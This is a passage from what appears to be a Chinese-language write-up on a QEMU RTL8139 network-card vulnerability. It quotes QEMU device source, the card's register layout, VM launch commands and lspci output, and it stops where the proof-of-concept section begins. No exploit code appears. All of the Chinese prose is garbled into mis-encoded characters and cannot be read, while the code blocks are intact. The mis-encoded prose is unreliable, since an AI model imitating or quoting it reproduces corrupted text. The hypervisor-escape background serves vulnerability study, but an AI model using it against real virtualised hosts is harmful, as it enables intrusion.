‡è®°æ—¶ï¼Œä¼šç›´æ¥è°ƒç”¨ <code>rtl8139_do_receive</code> æ¥æ”¶æ•°æ®ï¼Œæ•°æ®ä¼šå†™å…¥åˆ°æ¥æ”¶ç¼“å†²åŒºä¸­ã€‚</p><h2 id="0x04-æ¼æ´åˆ©ç”¨"><a href="#0x04-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x04 æ¼æ´åˆ©ç”¨"></a>0x04 æ¼æ´åˆ©ç”¨</h2><h3 id="4-1-RTL8139-ç½‘å¡ç®€ä»‹"><a href="#4-1-RTL8139-ç½‘å¡ç®€ä»‹" class="headerlink" title="4.1 RTL8139 ç½‘å¡ç®€ä»‹"></a>4.1 RTL8139 ç½‘å¡ç®€ä»‹</h3><p>QEMU æ¨¡æ‹Ÿçš„ RTL8139 ç½‘å¡åœ¨å‘é€å’Œæ¥æ”¶æ•°æ®æ—¶ï¼Œå†…éƒ¨ä»£ç åˆ†æ”¯çš„èµ°å‘å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äºç½‘å¡çš„çŠ¶æ€ï¼Œå¯¹åº”çš„ç»“æ„ä½“ä¸º <code>RTL8139State</code> ï¼ˆä½äºæ–‡ä»¶ <code>hw\net\rtl8139.c</code> ä¸­ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RTL8139State</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    PCIDevice parent_obj;</span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> phys[<span class="number">8</span>]; <span class="comment">/* mac address */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> mult[<span class="number">8</span>]; <span class="comment">/* multicast mask array */</span></span><br><span class="line">    <span class="comment">/* TxStatus0 in C mode*/</span> <span class="comment">/* also DTCCR[0] and DTCCR[1] in C+ mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> TxStatus[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> TxAddr[<span class="number">4</span>];   <span class="comment">/* TxAddr0 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> RxBuf;       <span class="comment">/* Receive buffer */</span></span><br><span class="line">    <span class="comment">/* internal variable, receive ring buffer size in C mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufferSize;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufPtr;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufAddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> IntrStatus;</span><br><span class="line">    <span class="keyword">uint16_t</span> IntrMask;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> TxConfig;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxConfig;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxMissed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> CSCR;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>  Cfg9346;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config0;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config1;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config3;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config4;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config5;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>  clock_enabled;</span><br><span class="line">    <span class="keyword">uint8_t</span>  bChipCmdState;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> MultiIntr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> BasicModeCtrl;</span><br><span class="line">    <span class="keyword">uint16_t</span> BasicModeStatus;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayAdvert;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayLPAR;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayExpansion;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> CpCmd;</span><br><span class="line">    <span class="keyword">uint8_t</span>  TxThresh;</span><br><span class="line"></span><br><span class="line">    NICState *nic;</span><br><span class="line">    NICConf conf;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C ring mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   currTxDesc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   cplus_enabled;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   currCPlusRxDesc;</span><br><span class="line">    <span class="keyword">uint32_t</span>   currCPlusTxDesc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   RxRingAddrLO;</span><br><span class="line">    <span class="keyword">uint32_t</span>   RxRingAddrHI;</span><br><span class="line"></span><br><span class="line">    EEprom9346 eeprom;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   TCTR;</span><br><span class="line">    <span class="keyword">uint32_t</span>   TimerInt;</span><br><span class="line">    <span class="keyword">int64_t</span>    TCTR_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tally counters */</span></span><br><span class="line">    RTL8139TallyCounters tally_counters;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Non-persistent data */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>   *cplus_txbuffer;</span><br><span class="line">    <span class="keyword">int</span>        cplus_txbuffer_len;</span><br><span class="line">    <span class="keyword">int</span>        cplus_txbuffer_offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* PCI interrupt timer */</span></span><br><span class="line">    QEMUTimer *timer;</span><br><span class="line"></span><br><span class="line">    MemoryRegion bar_io;</span><br><span class="line">    MemoryRegion bar_mem;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Support migration to/from old versions */</span></span><br><span class="line">    <span class="keyword">int</span> rtl8139_mmio_io_addr_dummy;</span><br><span class="line">&#125; RTL8139State;</span><br></pre></td></tr></table></figure><p><code>RTL8139State</code> ç»“æ„ä½“ä¸­çš„è®¸å¤šå­—æ®µå®é™…ä¸Šå°±æ˜¯ RTL8139 ç½‘å¡å†…éƒ¨çš„å¯„å­˜å™¨ï¼Œå…³äºè¿™äº›å¯„å­˜å™¨çš„æè¿°ï¼Œå¯ä»¥å‚è€ƒå‚å•† Realtek æä¾›çš„ Datasheet æ‰‹å†Œ [8]ï¼Œä¸‹å›¾ä¸º Phrack æ–‡ç«  [1] æä¾›çš„ä»‹ç»ï¼ˆè¿™é‡Œä¸º RTL8139 ç½‘å¡åœ¨ C+ æ¨¡å¼ä¸‹çš„å¯„å­˜å™¨ä»‹ç»ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x00    |           MAC0            |            MAR0            |</span><br><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x10    |                       TxStatus0                        |</span><br><span class="line">        +--------------------------------------------------------+</span><br><span class="line">0x20    |                        TxAddr0                         |</span><br><span class="line">        +-------------------+-------+----------------------------+</span><br><span class="line">0x30    |        RxBuf      |ChipCmd|                            |</span><br><span class="line">        +-------------+------+------+----------------------------+</span><br><span class="line">0x40    |   TxConfig  |  RxConfig   |            ...             |</span><br><span class="line">        +-------------+-------------+----------------------------+</span><br><span class="line">        |                                                        |</span><br><span class="line">        |             skipping irrelevant registers              |</span><br><span class="line">        |                                                        |</span><br><span class="line">        +---------------------------+--+------+------------------+</span><br><span class="line">0xd0    |           ...             |  |TxPoll|      ...         |</span><br><span class="line">        +-------+------+------------+--+------+--+---------------+</span><br><span class="line">0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |</span><br><span class="line">        +-------+------+------------+------------+---------------+</span><br></pre></td></tr></table></figure><ul><li>TxConfigï¼šå‘é€æ•°æ®ç›¸å…³çš„é…ç½®å‚æ•°</li><li>RxConfigï¼šæ¥æ”¶æ•°æ®ç›¸å…³çš„é…ç½®å‚æ•°</li><li>CpCmdï¼šC+ æ¨¡å¼ç›¸å…³é…ç½®å‚æ•°ï¼Œæ¯”å¦‚ï¼š<ul><li>CplusRxEnd è¡¨ç¤ºå¯ç”¨æ¥æ”¶</li><li>CplusTxEnd è¡¨ç¤ºå¯ç”¨å‘é€</li></ul></li><li>TxAddr0ï¼šTx descriptors table ç›¸å…³çš„ç‰©ç†å†…å­˜åœ°å€<ul><li>0x20 ~ 0x27ï¼šTransmit Normal Priority Descriptors Start Address</li><li>0x28 ~ 0x2Fï¼šTransmit High Priority Descriptors Start Address</li></ul></li><li>RxRingAddrLOï¼šRx descriptors table ç‰©ç†å†…å­˜åœ°å€ä½ 32 ä½</li><li>RxRingAddrHIï¼šRx descriptors table ç‰©ç†å†…å­˜åœ°å€é«˜ 32 ä½</li><li>TxPollï¼šè®©ç½‘å¡æ£€æŸ¥ Tx descriptors</li></ul><p>å…³äº <code>Descriptor</code> çš„å®šä¹‰ï¼ŒåŒæ ·å¯ä»¥å‚è€ƒå‚å•† Realtek æä¾›çš„ Datasheet æ‰‹å†Œ [8]ï¼Œä¸‹å›¾ä¸º <code>Transmit Descriptor</code> çš„å®šä¹‰ï¼š</p><p><img src="/uploads/202006/transmit-descriptor.png" alt="RTL8139 ç½‘å¡ Transmit Descriptor"></p><p>Phrack æ–‡ç«  [1] ç»™å‡ºçš„ç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-2-Port-Mapped-I-O"><a href="#4-2-Port-Mapped-I-O" class="headerlink" title="4.2 Port Mapped I/O"></a>4.2 Port Mapped I/O</h3><p>CPU å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼å’Œå¤–è®¾è¿›è¡Œäº¤äº’ï¼ˆè¿™é‡Œä¸è®¨è®º IRQã€DMA ç­‰å…¶ä»–äº¤äº’æ–¹å¼ï¼‰ï¼š</p><ul><li>Memory Mapped I/O å³ MMIO</li><li>Port Mapped I/O å³ PMIO</li></ul><p>MMIO å°†å¤–è®¾çš„å†…å­˜å’Œå¯„å­˜å™¨ç›´æ¥æ˜ å°„åˆ°ç³»ç»Ÿçš„åœ°å€ç©ºé—´ä¸­ï¼ˆè¿™éƒ¨åˆ†ç©ºé—´é€šå¸¸æ˜¯ä¿ç•™ç»™å¤–è®¾ä¸“ç”¨çš„ï¼‰ï¼Œè¿™æ · CPU é€šè¿‡æ™®é€šçš„æ±‡ç¼–æŒ‡ä»¤å³å¯å’Œå¤–è®¾è¿›è¡Œäº¤äº’ï¼›è€Œ PMIO åˆ™å°†å¤–è®¾çš„å†…å­˜å’Œå¯„å­˜å™¨æ˜ å°„åˆ°éš”ç¦»çš„åœ°å€ç©ºé—´ä¸­ï¼ˆPMIO åœ°å€ç©ºé—´çš„å¤§å°ä¸º 64KBï¼‰ï¼ŒCPU é€šè¿‡ <code>in</code> å’Œ <code>out</code> æŒ‡ä»¤å’Œå¤–è®¾è¿›è¡Œäº¤äº’ã€‚</p><p>åœ¨ Windows ä¸‹ï¼Œå¯ä»¥é€šè¿‡è®¾å¤‡ç®¡ç†å™¨æŸ¥çœ‹è®¾å¤‡çš„ PMIO åœ°å€èŒƒå›´ï¼Œä¸‹å›¾ä¸º VMware SVGA 3D çš„ PMIO åœ°å€åŒºé—´ä¹‹ä¸€ï¼š</p><p><img src="/uploads/202006/vmware-svga-3d-pmio.png" alt="VMware SVGA 3D PMIO"></p><p>åœ¨ Linux ä¸‹å¯ä»¥ä½¿ç”¨ pciutils ä¸­çš„ <code>lspci</code> æŸ¥çœ‹è®¾å¤‡çš„ PMIO åœ°å€åŒºé—´ [9]ï¼Œè¿™é‡Œæµ‹è¯•ç”¨çš„ Ubuntu Server å·²ç»è‡ªå¸¦äº† pciutilsï¼Œåªéœ€è¦åœ¨å¯åŠ¨æ—¶æ·»åŠ  RTL8139 ç½‘å¡å³å¯ï¼Œå¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -m 2048 -drive \</span></span><br><span class="line">    file=~/Desktop/vm/ubuntu.img,format=qcow2,if=ide,cache=writeback \</span><br><span class="line">    -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</span><br><span class="line">    -net user,hostfwd=tcp::2222-:22 -net nic</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ€åä¸€è¡Œçš„ä½œç”¨æ˜¯æŠŠ Ubuntu Server è™šæ‹Ÿæœºçš„ 22 ç«¯å£è½¬å‘åˆ°ä¸»æœºçš„ 2222 ç«¯å£ï¼Œæ–¹ä¾¿ä¸»æœºé€šè¿‡ SSH è®¿é—®è™šæ‹Ÿæœºï¼ˆVNC Viewer æ— æ³•å¤åˆ¶ç²˜è´´ï¼‰ï¼Œåœ¨ä¸»æœºä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯è¿æ¥è™šæ‹Ÿæœºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh vmusername@127.0.0.1 -p 2222</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡ <code>lspci</code> å‘½ä»¤å¯ä»¥çœ‹åˆ° RTL8139 ç½‘å¡çš„ PMIO çš„èµ·å§‹åœ°å€ä¸º <code>0xC000</code> ï¼Œå¤§å°ä¸º <code>256</code> å­—èŠ‚ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lspci</span></span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br><span class="line">00:04.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL-8100/8101L/8139 PCI Fast Ethernet Adapter (rev 20)</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> lspci -s 00:04.0 -v</span></span><br><span class="line">00:04.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL-8100/8101L/8139 PCI Fast Ethernet Adapter (rev 20)</span><br><span class="line">Subsystem: Red Hat, Inc. QEMU Virtual Machine</span><br><span class="line">Physical Slot: 4</span><br><span class="line">Flags: bus master, fast devsel, latency 0, IRQ 10</span><br><span class="line">I/O ports at c000 [size=256]</span><br><span class="line">Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">Expansion ROM at feb80000 [disabled] [size=256K]</span><br><span class="line">Kernel driver in use: 8139cp</span><br><span class="line">Kernel modules: 8139cp, 8139too</span><br></pre></td></tr></table></figure><h3 id="4-3-PMIO-è¯»å†™"><a href="#4-3-PMIO-è¯»å†™" class="headerlink" title="4.3 PMIO è¯»å†™"></a>4.3 PMIO è¯»å†™</h3><p>é€šè¿‡ç»“æ„ä½“ <code>RTL8139State</code> çš„æˆå‘˜ <code>bar_io</code> çš„äº¤å‰å¼•ç”¨å¯ä»¥å®šä½åˆ°å‡½æ•° <code>pci_rtl8139_realize</code> ï¼Œè¿™é‡Œå¯¹ PMIO å’Œ MMIO è¿›è¡Œäº†åˆå§‹åŒ–æ“ä½œï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_rtl8139_realize</span><span class="params">(PCIDevice *dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RTL8139State *s = RTL8139(dev);</span><br><span class="line">    DeviceState *d = DEVICE(dev);</span><br><span class="line">    <span class="keyword">uint8_t</span> *pci_conf;</span><br><span class="line"></span><br><span class="line">    pci_conf = dev-&gt;config;</span><br><span class="line">    pci_conf[PCI_INTERRUPT_PIN] = <span class="number">1</span>;    <span class="comment">/* interrupt pin A */</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> start of capability list, but no capability</span></span><br><span class="line"><span class="comment">     * list bit in status register, and offset 0xdc seems unused. */</span></span><br><span class="line">    pci_conf[PCI_CAPABILITY_LIST] = <span class="number">0xdc</span>;</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;bar_io, OBJECT(s), &amp;rtl8139_io_ops, s,</span><br><span class="line">                          <span class="string">"rtl8139"</span>, <span class="number">0x100</span>);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;bar_mem, OBJECT(s), &amp;rtl8139_mmio_ops, s,</span><br><span class="line">                          <span class="string">"rtl8139"</span>, <span class="number">0x100</span>);</span><br><span class="line">    pci_register_bar(dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;bar_io);</span><br><span class="line">    pci_register_bar(dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;bar_mem);</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PMIO çš„è¯»å†™å‡½æ•°å¯ä»¥ä»å˜é‡ <code>rtl8139_io_ops</code> ä¸­æ‰¾åˆ°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps rtl8139_io_ops = &#123;</span><br><span class="line">    .read = rtl8139_ioport_read,</span><br><span class="line">    .write = rtl8139_ioport_write,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">1</span>,</span><br><span class="line">        .max_access_size = <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>PMIO å†™å‡½æ•° <code>rtl8139_ioport_write</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_ioport_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (size) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        rtl8139_io_writeb(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        rtl8139_io_writew(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        rtl8139_io_writel(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™çš„é•¿åº¦å¯ä»¥æ˜¯å­—èŠ‚ã€å­—ã€åŒå­—ï¼Œè¿™é‡Œä»¥å­—èŠ‚ä¸ºå•ä½çš„ PMIO å†™å‡½æ•°ä¸º <code>rtl8139_io_writeb</code> ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writeb</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RTL8139State *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> MAC0 ... MAC0+<span class="number">4</span>:</span><br><span class="line">            s-&gt;phys[addr - MAC0] = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">        <span class="keyword">case</span> TxPoll:</span><br><span class="line">            DPRINTF(<span class="string">"C+ TxPoll write(b) val=0x%02x\n"</span>, val);</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll high priority transmission (not "</span></span><br><span class="line">                    <span class="string">"implemented)\n"</span>);</span><br><span class="line">                <span class="comment">//rtl8139_cplus_transmit(s);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">6</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll normal priority transmission\n"</span>);</span><br><span class="line">                rtl8139_cplus_transmit(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“å¾€ <code>TxPoll</code> å†™å…¥æ•°æ®æ—¶ï¼Œå¯ä»¥è§¦å‘ <code>C+ TxPoll normal priority transmission</code> ï¼Œå³è°ƒç”¨å‡½æ•° <code>rtl8139_cplus_transmit</code> ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_cplus_transmit</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> txcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (rtl8139_cplus_transmit_one(s))</span><br><span class="line">    &#123;</span><br><span class="line">        ++txcount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark transfer completed */</span></span><br><span class="line">    <span class="keyword">if</span> (!txcount)</span><br><span class="line">    &#123;</span><br><span class="line">        DPRINTF(<span class="string">"C+ mode : transmitter queue stalled, current TxDesc = %d\n"</span>,</span><br><span class="line">            s-&gt;currCPlusTxDesc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* update interrupt status */</span></span><br><span class="line">        s-&gt;IntrStatus |= TxOK;</span><br><span class="line">        rtl8139_update_irq(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¼šå¾ªç¯è°ƒç”¨ <code>rtl8139_cplus_transmit_one</code> ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨æ¼æ´çš„å‡½æ•°ï¼</p><h3 id="4-4-æ¼æ´è§¦å‘"><a href="#4-4-æ¼æ´è§¦å‘" class="headerlink" title="4.4 æ¼æ´è§¦å‘"></a>4.4 æ¼æ´è§¦å‘</h3><p>å¼„æ¸…æ¥šæ¼æ´çš„åŸç†ä¹‹åï¼Œç¼–å†™ PoC å°±æ¯”è¾ƒç®€å•äº†ï¼å¯¹ Linux 